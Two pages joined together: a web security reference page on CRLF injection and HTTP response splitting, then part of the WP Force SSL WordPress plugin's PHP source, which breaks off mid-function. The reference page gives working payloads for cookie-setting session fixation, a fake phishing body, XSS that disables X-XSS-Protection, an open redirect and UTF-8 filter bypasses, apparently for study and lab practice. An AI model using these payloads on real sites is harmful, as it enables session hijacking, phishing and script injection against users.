  + [Vulnerability Title](../_template_vuln/)

Table of contents

* [Summary](#summary)
* [Methodology](#methodology)
  + [Session Fixation](#session-fixation)
  + [Cross Site Scripting](#cross-site-scripting)
  + [Open Redirect](#open-redirect)
* [Filter Bypass](#filter-bypass)
* [Labs](#labs)
* [References](#references)

# Carriage Return Line Feed

> CRLF Injection is a web security vulnerability that arises when an attacker injects unexpected Carriage Return (CR) (\r) and Line Feed (LF) (\n) characters into an application. These characters are used to signify the end of a line and the start of a new one in network protocols like HTTP, SMTP, and others. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.

## Summary

* [Methodology](#methodology)
  + [Session Fixation](#session-fixation)
  + [Cross Site Scripting](#cross-site-scripting)
  + [Open Redirect](#open-redirect)
* [Filter Bypass](#filter-bypass)
* [Labs](#labs)
* [References](#references)

## Methodology

HTTP Response Splitting is a security vulnerability where an attacker manipulates an HTTP response by injecting Carriage Return (CR) and Line Feed (LF) characters (collectively called CRLF) into a response header. These characters mark the end of a header and the start of a new line in HTTP responses.

**CRLF Characters**:

* `CR` (`\r`, ASCII 13): Moves the cursor to the beginning of the line.
* `LF` (`\n`, ASCII 10): Moves the cursor to the next line.

By injecting a CRLF sequence, the attacker can break the response into two parts, effectively controlling the structure of the HTTP response. This can result in various security issues, such as:

* Cross-Site Scripting (XSS): Injecting malicious scripts into the second response.
* Cache Poisoning: Forcing incorrect content to be stored in caches.
* Header Manipulation: Altering headers to mislead users or systems

### Session Fixation

A typical HTTP response header looks like this:

```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=abc123

```

If user input `value\r\nSet-Cookie: admin=true` is embedded into the headers without sanitization:

```
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: sessionid=value
Set-Cookie: admin=true

```

Now the attacker has set their own cookie.

### Cross Site Scripting

Beside the session fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).

**Requested page**

```
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E

```

**HTTP response**

```
Set-Cookie:en
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 34

<html>You have been Phished</html>

```

In the case of an XSS, the CRLF injection allows to inject the `X-XSS-Protection` header with the value value "0", to disable it. And then we can add our HTML tag containing Javascript code .

**Requested page**

```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e

```

**HTTP Response**

```
HTTP/1.1 200 OK
Date: Tue, 20 Dec 2016 14:34:03 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 22907
Connection: close
X-Frame-Options: SAMEORIGIN
Last-Modified: Tue, 20 Dec 2016 11:50:50 GMT
ETag: "842fe-597b-54415a5c97a80"
Vary: Accept-Encoding
X-UA-Compatible: IE=edge
Server: NetDNA-cache/2.2
Link: <https://example.com/[INJECTION STARTS HERE]
Content-Length:35
X-XSS-Protection:0

23
<svg onload=alert(document.domain)>
0

```
### Open Redirect

Inject a `Location` header to force a redirect for the user.

```
%0d%0aLocation:%20http://myweb.com

```
## Filter Bypass

[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header field values use only a subset of the US-ASCII charset.

> Newly defined header fields SHOULD limit their field values to US-ASCII octets.

Firefox followed the spec by stripping off any out-of-range characters when setting cookies instead of encoding them.

| UTF-8 Character | Hex | Unicode | Stripped |
| --- | --- | --- | --- |
| `嘊` | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
| `嘍` | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
| `嘾` | `%E5%98%BE` | `\u563e` | `%3E` (>) |
| `嘼` | `%E5%98%BC` | `\u563c` | `%3C` (<) |

The UTF-8 character `嘊` contains `0a` in the last part of its hex format, which would be converted as `\n` by Firefox.

An example payload using UTF-8 characters would be:

```
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾

```

URL encoded version

```
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE

```
## Labs

* [PortSwigger - HTTP/2 request splitting via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)
* [Root Me - CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)

## References

* [CRLF Injection - CWE-93 - OWASP - May 20, 2022](https://www.owasp.org/index.php/CRLF_Injection)
* [CRLF injection on Twitter or why blacklists fail - XSS Jigsaw - April 21, 2015](https://web.archive.org/web/20150425024348/https%3A//blog.innerht.ml/twitter-crlf-injection/)
* [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - December 20, 2016](https://vulners.com/hackerone/H1%3A192749)

November 25, 2024

**Share this content**

Back to top

Made with
[Material for MkDocs](https://squidfunk.github.io/mkdocs-material/)



=== Content from plugins.trac.wordpress.org_98157e78_20250111_160148.html ===


[Skip to content](#main)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Download & Extend](https://wordpress.org/download/)
  + [Get WordPress](https://wordpress.org/download/)
  + [Themes](https://wordpress.org/themes/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Mobile](https://wordpress.org/mobile/)
  + [Hosting](https://wordpress.org/hosting/)
  + [Openverse ↗︎](https://openverse.org/)
* [Learn](https://learn.wordpress.org/)
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* [Community](https://make.wordpress.org/)
  + [Make WordPress](https://make.wordpress.org/)
  + [Photo Directory](https://wordpress.org/photos/)
  + [Five for the Future](https://wordpress.org/five-for-the-future/)
  + [WordCamp ↗︎](https://central.wordcamp.org/)
  + [Meetups ↗︎](https://www.meetup.com/pro/wordpress/)
  + [Job Board ↗︎](https://jobs.wordpress.net/)
* [About](https://wordpress.org/about/)
  + [About WordPress](https://wordpress.org/about/)
  + [Showcase](https://wordpress.org/showcase/)
  + [Enterprise](https://wordpress.org/enterprise/)
  + [Gutenberg ↗︎](https://wordpress.org/gutenberg/)
  + [WordPress Swag Store ↗︎](https://mercantile.wordpress.org/)
* [Get WordPress](https://wordpress.org/download/)

Search Trac

[Get WordPress](https://wordpress.org/download/)

## [Plugin Directory](//wordpress.org/plugins/)

Search:

* [Login](https://login.wordpress.org/?redirect_to=http%3A%2F%2Fplugins.trac.wordpress.org%2Fbrowser%2Fwp-force-ssl%2Ftags%2F1.66%2Fwp-force-ssl.php)

* [Timeline](/timeline)
* [View Tickets](/report)
* [Browse Source](/browser)

## Context Navigation

* ← [Previous Revision](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=2656791 "Revision 2656791")
* [Next Revision](/browser/wp-force-ssl/trunk/wp-force-ssl.php?rev=3099110 "Revision 3099110") →
* [Blame](/browser/wp-force-ssl/trunk/wp-force-ssl.php?annotate=blame "Annotate each line with the last changed revision (this can be time consuming...)")
* [Revision Log](/log/wp-force-ssl/tags/1.66/wp-force-ssl.php)

---

# [source:](/browser?order=name "Go to repository root") [wp-force-ssl](/browser/wp-force-ssl?order=name "View wp-force-ssl")/[tags](/browser/wp-force-ssl/tags?order=name "View tags")/[1.66](/browser/wp-force-ssl/tags/1.66?order=name "View 1.66")/[wp-force-ssl.php](/browser/wp-force-ssl/tags/1.66/wp-force-ssl.php?order=name "View wp-force-ssl.php")

View diff against:

View revision:

| [Last change](/changeset/3058608/wp-force-ssl/trunk/wp-force-ssl.php "View differences") on this file was [3058608](/changeset/3058608/ "View changeset 3058608"), checked in by WebFactory, [10 months ago](/timeline?from=2024-03-25T20%3A13%3A23Z&precision=second "See timeline at 03/25/2024 08:13:23 PM") |
| --- |
| Minor update |
| **File size:** 49.7 KB | |

| Line |  |
| --- | --- |
| [1](#L1) | <?php |
| [2](#L2) | /\* |
| [3](#L3) | Plugin Name: WP Force SSL |
| [4](#L4) | Plugin URI: https://wpforcessl.com/ |
| [5](#L5) | Description: Redirect all traffic from HTTP to HTTPS and fix other SSL issues. |
| [6](#L6) | Author: WebFactory Ltd |
| [7](#L7) | Author URI: https://www.webfactoryltd.com/ |
| [8](#L8) | Version: 1.66 |
| [9](#L9) | Text Domain: wp-force-ssl |
| [10](#L10) | Requires at least: 4.6 |
| [11](#L11) | Requires PHP: 5.2 |
| [12](#L12) | Tested up to: 6.5 |
| [13](#L13) |  |
| [14](#L14) | Copyright 2019 - 2024  WebFactory Ltd  (email: support@webfactoryltd.com) |
| [15](#L15) |  |
| [16](#L16) | This program is free software; you can redistribute it and/or modify |
| [17](#L17) | it under the terms of the GNU General Public License, version 2, as |
| [18](#L18) | published by the Free Software Foundation. |
| [19](#L19) |  |
| [20](#L20) | This program is distributed in the hope that it will be useful, |
| [21](#L21) | but WITHOUT ANY WARRANTY; without even the implied warranty of |
| [22](#L22) | MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the |
| [23](#L23) | GNU General Public License for more details. |
| [24](#L24) |  |
| [25](#L25) | You should have received a copy of the GNU General Public License |
| [26](#L26) | along with this program; if not, write to the Free Software |
| [27](#L27) | Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA |
| [28](#L28) | \*/ |
| [29](#L29) |  |
| [30](#L30) |  |
| [31](#L31) | // if the file is called directly |
| [32](#L32) | if (!defined('ABSPATH')) { |
| [33](#L33) | exit('You are not allowed to access this file directly.'); |
| [34](#L34) | } |
| [35](#L35) |  |
| [36](#L36) | require\_once dirname(\_\_FILE\_\_) . '/inc/wp-force-ssl-status-tests.php'; |
| [37](#L37) | require\_once dirname(\_\_FILE\_\_) . '/inc/wp-force-ssl-utility.php'; |
| [38](#L38) | require\_once dirname(\_\_FILE\_\_) . '/wf-flyout/wf-flyout.php'; |
| [39](#L39) | new wf\_flyout(\_\_FILE\_\_); |
| [40](#L40) |  |
| [41](#L41) | define('WPFSSL\_OPTIONS\_KEY', 'wpfssl\_options'); |
| [42](#L42) | define('WPFSSL\_META\_KEY', 'wpfssl\_meta'); |
| [43](#L43) |  |
| [44](#L44) |  |
| [45](#L45) | // start up the engine |
| [46](#L46) | class wpForceSSL |
| [47](#L47) | { |
| [48](#L48) | protected static $instance = false; |
| [49](#L49) | public $options = array(); |
| [50](#L50) | public $version = 0; |
| [51](#L51) | public $plugin\_url = ''; |
| [52](#L52) | public $plugin\_dir = ''; |
| [53](#L53) | public $meta = array(); |
| [54](#L54) |  |
| [55](#L55) |  |
| [56](#L56) | /\*\* |
| [57](#L57) | \* Check if minimum WP and PHP versions are available |
| [58](#L58) | \* Register all hooks for the plugin |
| [59](#L59) | \* |
| [60](#L60) | \* @since 1.5 |
| [61](#L61) | \* |
| [62](#L62) | \* @return null |
| [63](#L63) | \* |
| [64](#L64) | \*/ |
| [65](#L65) | private function \_\_construct() |
| [66](#L66) | { |
| [67](#L67) | $this->get\_plugin\_version(); |
| [68](#L68) |  |
| [69](#L69) | if (false === $this->check\_wp\_version(4.6)) { |
| [70](#L70) | return false; |
| [71](#L71) | } |
| [72](#L72) |  |
| [73](#L73) | $this->options = get\_option(WPFSSL\_OPTIONS\_KEY, array()); |
| [74](#L74) | $default = array( |
| [75](#L75) | 'wpfs\_ssl' => 'yes', |
| [76](#L76) | 'wpfs\_hsts' => 'no', |
| [77](#L77) | 'wpfs\_expect\_ct' => 'no', |
| [78](#L78) | 'wpfs\_adminbar\_menu' => 'yes', |
| [79](#L79) | 'wpfs\_dashboard\_widget' => 'yes' |
| [80](#L80) | ); |
| [81](#L81) | $this->options = array\_merge($default, $this->options); |
| [82](#L82) |  |
| [83](#L83) | $this->plugin\_url = plugin\_dir\_url(\_\_FILE\_\_); |
| [84](#L84) | $this->plugin\_dir = plugin\_dir\_path(\_\_FILE\_\_); |
| [85](#L85) | $this->meta = $this->get\_meta(); |
| [86](#L86) |  |
| [87](#L87) | if ($this->options['wpfs\_ssl'] == 'yes') { |
| [88](#L88) | add\_action('template\_redirect', array($this, 'wpfs\_core')); |
| [89](#L89) | } |
| [90](#L90) | if ($this->options['wpfs\_hsts'] == 'yes') { |
| [91](#L91) | add\_action('send\_headers', array($this, 'to\_strict\_transport\_security')); |
| [92](#L92) | } |
| [93](#L93) | if ($this->options['wpfs\_expect\_ct'] == 'yes') { |
| [94](#L94) | add\_action('send\_headers', array($this, 'enable\_expect\_ct')); |
| [95](#L95) | } |
| [96](#L96) |  |
| [97](#L97) | add\_action('admin\_menu', array($this, 'add\_settings\_page')); |
| [98](#L98) | add\_action('admin\_head',  array($this, 'cleanup\_enqueues'), 99999); |
| [99](#L99) | add\_action('wp\_before\_admin\_bar\_render', array($this, 'admin\_bar')); |
| [100](#L100) | add\_filter('admin\_footer\_text', array($this, 'admin\_footer\_text')); |
| [101](#L101) | add\_action('admin\_print\_scripts', array($this, 'remove\_admin\_notices')); |
| [102](#L102) | add\_action('admin\_enqueue\_scripts', array($this, 'admin\_scripts')); |
| [103](#L103) | add\_action('wp\_dashboard\_setup', array($this, 'add\_widget')); |
| [104](#L104) |  |
| [105](#L105) | add\_filter('plugin\_action\_links\_' . plugin\_basename(\_\_FILE\_\_), array($this, 'plugin\_action\_links')); |
| [106](#L106) | add\_filter('plugin\_row\_meta', array($this, 'plugin\_meta\_links'), 10, 2); |
| [107](#L107) |  |
| [108](#L108) | // ajax hooks for the settings, and SSL certificate test |
| [109](#L109) | add\_action('wp\_ajax\_wpfs\_save\_settting', array($this, 'ajax\_save\_setting')); |
| [110](#L110) | add\_action('wp\_ajax\_wpfs\_test\_ssl', array($this, 'ajax\_check\_ssl')); |
| [111](#L111) | add\_action('wp\_ajax\_wpfs\_run\_tests', array($this, 'ajax\_run\_tests')); |
| [112](#L112) | add\_action('wp\_ajax\_wpfs\_dismiss\_notice', array($this, 'ajax\_dismiss\_notice')); |
| [113](#L113) | } // \_\_construct |
| [114](#L114) |  |
| [115](#L115) |  |
| [116](#L116) | /\*\* |
| [117](#L117) | \* Get plugin meta data, create if not existent |
| [118](#L118) | \* |
| [119](#L119) | \* @since 1.5 |
| [120](#L120) | \* |
| [121](#L121) | \* @return array plugin meta |
| [122](#L122) | \* |
| [123](#L123) | \*/ |
| [124](#L124) | public function get\_meta() |
| [125](#L125) | { |
| [126](#L126) | $meta = get\_option(WPFSSL\_META\_KEY, array()); |
| [127](#L127) | $default = array( |
| [128](#L128) | 'first\_version' => $this->get\_plugin\_version(), |
| [129](#L129) | 'first\_install' => time(), |
| [130](#L130) | 'hide\_welcome\_pointer' => false |
| [131](#L131) | ); |
| [132](#L132) |  |
| [133](#L133) | $meta = array\_merge($default, $meta); |
| [134](#L134) | if (sizeof($default) != sizeof($meta)) { |
| [135](#L135) | update\_option(WPFSSL\_META\_KEY, $meta); |
| [136](#L136) | } |
| [137](#L137) |  |
| [138](#L138) | return $meta; |
| [139](#L139) | } // get\_meta |
| [140](#L140) |  |
| [141](#L141) |  |
| [142](#L142) | /\*\* |
| [143](#L143) | \* Dismiss notice via AJAX call |
| [144](#L144) | \* |
| [145](#L145) | \* @return null |
| [146](#L146) | \*/ |
| [147](#L147) | function ajax\_dismiss\_notice() |
| [148](#L148) | { |
| [149](#L149) | check\_ajax\_referer('wpfs\_dismiss\_notice'); |
| [150](#L150) |  |
| [151](#L151) | if (!current\_user\_can('administrator')) { |
| [152](#L152) | wp\_send\_json\_error('You are not allowed to run this action.'); |
| [153](#L153) | } |
| [154](#L154) |  |
| [155](#L155) | $notice\_name = trim(sanitize\_text\_field(@$\_GET['notice\_name'])); |
| [156](#L156) |  |
| [157](#L157) | if ($notice\_name != 'welcome') { |
| [158](#L158) | wp\_send\_json\_error('Unknown notice'); |
| [159](#L159) | } else { |
| [160](#L160) | $this->meta['hide\_welcome\_pointer'] = true; |
| [161](#L161) | update\_option(WPFSSL\_META\_KEY, $this->meta); |
| [162](#L162) | wp\_send\_json\_success(); |
| [163](#L163) | } |
| [164](#L164) | } // ajax\_dismiss\_notice |
| [165](#L165) |  |
| [166](#L166) |  |
| [167](#L167) | /\*\* |
| [168](#L168) | \* Get plugin version |
| [169](#L169) | \* |
| [170](#L170) | \* @since 1.5 |
| [171](#L171) | \* |
| [172](#L172) | \* @return string plugin version |
| [173](#L173) | \* |
| [174](#L174) | \*/ |
| [175](#L175) | public function get\_plugin\_version() |
| [176](#L176) | { |
| [177](#L177) | $plugin\_data = get\_file\_data(\_\_FILE\_\_, array('version' => 'Version'), 'plugin'); |
| [178](#L178) | $this->version = $plugin\_data['version']; |
| [179](#L179) |  |
| [180](#L180) | return $plugin\_data['version']; |
| [181](#L181) | } // get\_plugin\_version |
| [182](#L182) |  |
| [183](#L183) |  |
| [184](#L184) | /\*\* |
| [185](#L185) | \* Return instance, create if not already existing |
| [186](#L186) | \* |
| [187](#L187) | \* @since 1.5 |
| [188](#L188) | \* |
| [189](#L189) | \* @return object wpForceSLL instance |
| [190](#L190) | \* |
| [191](#L191) | \*/ |
| [192](#L192) | public static function get\_instance() |
| [193](#L193) | { |
| [194](#L194) | if (false == is\_a(self::$instance, 'wpForceSSL')) { |
| [195](#L195) | self::$instance = new self; |
| [196](#L196) | } |
| [197](#L197) |  |
| [198](#L198) | return self::$instance; |
| [199](#L199) | } // get\_instance |
| [200](#L200) |  |
| [201](#L201) |  |
| [202](#L202) | /\*\* |
| [203](#L203) | \* Run websites tests |
| [204](#L204) | \* |
| [205](#L205) | \* @return null |
| [206](#L206) | \*/ |
| [207](#L207) | function ajax\_run\_tests() |
| [208](#L208) | { |
| [209](#L209) | global $wp\_force\_ssl\_tests; |
| [210](#L210) |  |
| [211](#L211) | check\_ajax\_referer('run\_tests\_nonce\_action'); |
| [212](#L212) | if (!current\_user\_can('administrator')) { |
| [213](#L213) | wp\_send\_json\_error('You are not allowed to run this action.'); |
| [214](#L214) | } |
| [215](#L215) |  |
| [216](#L216) | if (isset($\_REQUEST['force']) && (bool) $\_REQUEST['force'] === true) { |
| [217](#L217) | $nocache = true; |
| [218](#L218) | } else { |
| [219](#L219) | $nocache = false; |
| [220](#L220) | } |
| [221](#L221) |  |
| [222](#L222) | $res = $wp\_force\_ssl\_tests->get\_tests\_results($nocache); |
| [223](#L223) | if (is\_wp\_error($res)) { |
| [224](#L224) | wp\_send\_json\_error($res->get\_error\_message()); |
| [225](#L225) | } else { |
| [226](#L226) | wp\_send\_json\_success($res); |
| [227](#L227) | } |
| [228](#L228) | } // ajax\_run\_tool |
| [229](#L229) |  |
| [230](#L230) |  |
| [231](#L231) | /\*\* |
| [232](#L232) | \* Enqueue admin scripts |
| [233](#L233) | \* |
| [234](#L234) | \* @since 1.5 |
| [235](#L235) | \* |
| [236](#L236) | \* @return null |
| [237](#L237) | \* |
| [238](#L238) | \*/ |
| [239](#L239) | public function admin\_scripts($hook) |
| [240](#L240) | { |
| [241](#L241) | $meta = $this->get\_meta(); |
| [242](#L242) | $pointers = array(); |
| [243](#L243) |  |
| [244](#L244) | if (!$meta['hide\_welcome\_pointer'] && !$this->is\_plugin\_page() && current\_user\_can('administrator')) { |
| [245](#L245) | $pointers['\_nonce\_dismiss\_pointer'] = wp\_create\_nonce('wpfs\_dismiss\_notice'); |
| [246](#L246) | $pointers['welcome'] = array('target' => '#menu-settings', 'edge' => 'left', 'align' => 'right', 'content' => 'Thank you for installing the <b style="font-weight: 800;">WP Force SSL</b> plugin!<br>Open <a href="' . admin\_url('options-general.php?page=wpfs-settings') . '">Settings - WP Force SSL</a> to access SSL settings.'); |
| [247](#L247) |  |
| [248](#L248) | wp\_enqueue\_style('wp-pointer'); |
| [249](#L249) |  |
| [250](#L250) | wp\_enqueue\_script('wp-force-ssl-pointers', $this->plugin\_url . 'js/wpfs-pointers.js', array('jquery'), $this->version, true); |
| [251](#L251) | wp\_enqueue\_script('wp-pointer'); |
| [252](#L252) | wp\_localize\_script('wp-pointer', 'wp\_force\_ssl\_pointers', $pointers); |
| [253](#L253) | } |
| [254](#L254) |  |
| [255](#L255) | if (false == $this->is\_plugin\_page()) { |
| [256](#L256) | return; |
| [257](#L257) | } |
| [258](#L258) |  |
| [259](#L259) | wp\_enqueue\_style('wpfs-style', $this->plugin\_url . 'css/wpfs-style.css', null, $this->version); |
| [260](#L260) | wp\_enqueue\_style('wpfs-sweetalert2-style', $this->plugin\_url . 'css/sweetalert2.min.css', null, $this->version); |
| [261](#L261) | wp\_enqueue\_style('wp-jquery-ui-dialog'); |
| [262](#L262) |  |
| [263](#L263) | wp\_enqueue\_script('jquery-ui-tabs'); |
| [264](#L264) | wp\_enqueue\_script('jquery-ui-core'); |
| [265](#L265) | wp\_enqueue\_script('jquery-ui-position'); |
| [266](#L266) | wp\_enqueue\_script('jquery-ui-dialog'); |
| [267](#L267) |  |
| [268](#L268) | wp\_enqueue\_script('wpfs-sweetalert2', $this->plugin\_url . 'js/sweetalert2.min.js', array('jquery'), $this->version, true); |
| [269](#L269) | wp\_enqueue\_script('wpfs-script', $this->plugin\_url . 'js/wpfs-script.js', array('jquery'), $this->version, true); |
| [270](#L270) |  |
| [271](#L271) | wp\_localize\_script('wpfs-script', 'wpfs', array( |
| [272](#L272) | 'ajaxurl' => admin\_url('admin-ajax.php'), |
| [273](#L273) | 'loading\_icon\_url' => plugins\_url('img/wp-ssl.png', \_\_FILE\_\_), |
| [274](#L274) | 'testing' => \_\_('Testing. Please wait ...', 'wp-force-ssl'), |
| [275](#L275) | 'saving' => \_\_('Saving. Please wait ...', 'wp-force-ssl'), |
| [276](#L276) | 'test\_success' => \_\_('Test Completed Successfully', 'wp-force-ssl'), |
| [277](#L277) | 'test\_failed' => \_\_('Test Failed', 'wp-force-ssl'), |
| [278](#L278) | 'home\_url' => get\_home\_url(), |
| [279](#L279) | 'save\_success' => \_\_('Settings saved', 'wp-force-ssl'), |
| [280](#L280) | 'undocumented\_error' => \_\_('An undocumented error has occurred. Please refresh the page and try again.', 'wp-force-ssl'), |
| [281](#L281) | 'documented\_error' => \_\_('An error has occurred.', 'wp-force-ssl'), |
| [282](#L282) | 'nonce\_save\_settings' => wp\_create\_nonce('save\_settting\_nonce\_action'), |
| [283](#L283) | 'nonce\_test\_ssl' => wp\_create\_nonce('test\_ssl\_nonce\_action'), |
| [284](#L284) | 'nonce\_run\_tests' => wp\_create\_nonce('run\_tests\_nonce\_action') |
| [285](#L285) | )); |
| [286](#L286) |  |
| [287](#L287) | $this->cleanup\_enqueues(); |
| [288](#L288) | } // admin\_scripts |
| [289](#L289) |  |
| [290](#L290) |  |
| [291](#L291) | /\*\* |
| [292](#L292) | \* Load text domain |
| [293](#L293) | \* |
| [294](#L294) | \* @since 1.5 |
| [295](#L295) | \* |
| [296](#L296) | \* @return null |
| [297](#L297) | \* |
| [298](#L298) | \*/ |
| [299](#L299) | static function plugins\_loaded() |
| [300](#L300) | { |
| [301](#L301) | load\_plugin\_textdomain('wp-force-ssl'); |
| [302](#L302) | } // plugins\_loaded |
| [303](#L303) |  |
| [304](#L304) |  |
| [305](#L305) | /\*\* |
| [306](#L306) | \* Register menu page |
| [307](#L307) | \* |
| [308](#L308) | \* @since 1.5 |
| [309](#L309) | \* |
| [310](#L310) | \* @return null |
| [311](#L311) | \* |
| [312](#L312) | \*/ |
| [313](#L313) | public function add\_settings\_page() |
| [314](#L314) | { |
| [315](#L315) | global $wp\_force\_ssl\_tests; |
| [316](#L316) | $test\_results = $wp\_force\_ssl\_tests->count\_statuses(); |
| [317](#L317) |  |
| [318](#L318) | add\_options\_page( |
| [319](#L319) | \_\_('WP Force SSL', 'wp-force-ssl'), |
| [320](#L320) | \_\_('WP Force SSL', 'wp-force-ssl') . ($test\_results['fail'] ? sprintf(' <span class="wfssl-failed-tests awaiting-mod">%d</span>', $test\_results['fail']) : ''), |
| [321](#L321) | 'administrator', |
| [322](#L322) | 'wpfs-settings', |
| [323](#L323) | array($this, 'settings\_page\_content') |
| [324](#L324) | ); |
| [325](#L325) | } // add\_settings\_page |
| [326](#L326) |  |
| [327](#L327) |  |
| [328](#L328) | /\*\* |
| [329](#L329) | \* Shows admin top menu entry |
| [330](#L330) | \* |
| [331](#L331) | \* @since 1.6 |
| [332](#L332) | \* |
| [333](#L333) | \* @return null |
| [334](#L334) | \* |
| [335](#L335) | \*/ |
| [336](#L336) | function admin\_bar() |
| [337](#L337) | { |
| [338](#L338) | if (!is\_admin()) { |
| [339](#L339) | return; |
| [340](#L340) | } |
| [341](#L341) |  |
| [342](#L342) | global $wp\_admin\_bar, $wp\_force\_ssl\_tests; |
| [343](#L343) |  |
| [344](#L344) | $test\_results = $wp\_force\_ssl\_tests->count\_statuses(); |
| [345](#L345) | $plugin\_name = \_\_('WP Force SSL', 'wp-force-ssl'); |
| [346](#L346) | $plugin\_logo = esc\_url($this->plugin\_url) . 'img/wp-force-ssl-icon.png'; |
| [347](#L347) |  |
| [348](#L348) | if ( |
| [349](#L349) | 'yes' != $this->options['wpfs\_adminbar\_menu'] || |
| [350](#L350) | false === current\_user\_can('administrator') || |
| [351](#L351) | false === apply\_filters('wp\_force\_ssl\_show\_admin\_bar', true) |
| [352](#L352) | ) { |
| [353](#L353) | return; |
| [354](#L354) | } |
| [355](#L355) |  |
| [356](#L356) | $title = '<div class="wfssl-adminbar-icon" style="display:inline-block;"><img style="height: 22px; padding: 4px; margin-bottom: -10px;  filter: invert(1) brightness(1.2) grayscale(1);" src="' . $plugin\_logo . '" alt="' . $plugin\_name . '" title="' . $plugin\_name . '"></div> <span class="ab-label">' . $plugin\_name . '</span>'; |
| [357](#L357) | if ($test\_results['fail']) { |
| [358](#L358) | $title .= sprintf(' <span class="wfssl-failed-tests awaiting-mod" style="display: inline-block;vertical-align: top;box-sizing: border-box;margin: 1px 0 -1px 2px; padding: 0 5px; min-width: 18px;height: 18px; border-radius: 9px;background-color: #d63638; color: #fff; font-size: 11px; line-height: 1.6; text-align: center; z-index: 26;vertical-align: text-bottom;">%d</span>', $test\_results['fail']); |
| [359](#L359) | } |
| [360](#L360) |  |
| [361](#L361) | $wp\_admin\_bar->add\_node(array( |
| [362](#L362) | 'id'    => 'wfssl-ab', |
| [363](#L363) | 'title' => $title, |
| [364](#L364) | 'href'  => admin\_url('options-general.php?page=wpfs-settings'), |
| [365](#L365) | 'parent' => '', |
| [366](#L366) | )); |
| [367](#L367) |  |
| [368](#L368) | $wp\_admin\_bar->add\_node(array( |
| [369](#L369) | 'id'    => 'wfssl-status', |
| [370](#L370) | 'title' => 'Status', |
| [371](#L371) | 'href'  => admin\_url('options-general.php?page=wpfs-settings#tab\_status'), |
| [372](#L372) | 'parent' => 'wfssl-ab' |
| [373](#L373) | )); |
| [374](#L374) |  |
| [375](#L375) | $wp\_admin\_bar->add\_node(array( |
| [376](#L376) | 'id'    => 'wfssl-settings', |
| [377](#L377) | 'title' => 'Settings', |
| [378](#L378) | 'href'  => admin\_url('options-general.php?page=wpfs-settings#tab\_settings'), |
| [379](#L379) | 'parent' => 'wfssl-ab' |
| [380](#L380) | )); |
| [381](#L381) |  |
| [382](#L382) | $wp\_admin\_bar->add\_node(array( |
| [383](#L383) | 'id'    => 'wfssl-scanner', |
| [384](#L384) | 'title' => 'Content Scanner', |
| [385](#L385) | 'href'  => admin\_url('options-general.php?page=wpfs-settings#tab\_scanner'), |
| [386](#L386) | 'parent' => 'wfssl-ab' |
| [387](#L387) | )); |
| [388](#L388) |  |
| [389](#L389) | $wp\_admin\_bar->add\_node(array( |
| [390](#L390) | 'id'    => 'wfssl-snapshots', |
| [391](#L391) | 'title' => 'SSL Certificate', |
| [392](#L392) | 'href'  => admin\_url('options-general.php?page=wpfs-settings#tab\_ssl'), |
| [393](#L393) | 'parent' => 'wfssl-ab' |
| [394](#L394) | )); |
| [395](#L395) | } // admin\_bar |
| [396](#L396) |  |
| [397](#L397) |  |
| [398](#L398) | // add widget to dashboard |
| [399](#L399) | function add\_widget() |
| [400](#L400) | { |
| [401](#L401) | if (current\_user\_can('administrator') && $this->options['wpfs\_dashboard\_widget'] == 'yes') { |
| [402](#L402) | add\_meta\_box('wpfssl\_status', 'WP Force SSL Status', array($this, 'widget\_content'), 'dashboard', 'side', 'high'); |
| [403](#L403) | } |
| [404](#L404) | } // add\_widget |
| [405](#L405) |  |
| [406](#L406) |  |
| [407](#L407) | // render dashboard widget |
| [408](#L408) | function widget\_content() |
| [409](#L409) | { |
| [410](#L410) | global $wp\_force\_ssl\_tests; |
| [411](#L411) | $widget\_html = ''; |
| [412](#L412) |  |
| [413](#L413) | $tests = $wp\_force\_ssl\_tests->get\_tests\_results(false); |
| [414](#L414) | if (is\_wp\_error($tests)) { |
| [415](#L415) | wpForceSSL\_Utility::wp\_kses\_wf('<p>Unable to get test results. Sorry :(<br>Open <a href="' . admin\_url('options-general.php?page=wpfs-settings#tab\_status') . '">WP Force SSL</a> plugin to contact support.</p>'); |
| [416](#L416) | return; |
| [417](#L417) | } |
| [418](#L418) |  |
| [419](#L419) | $widget\_html .= '<style>'; |
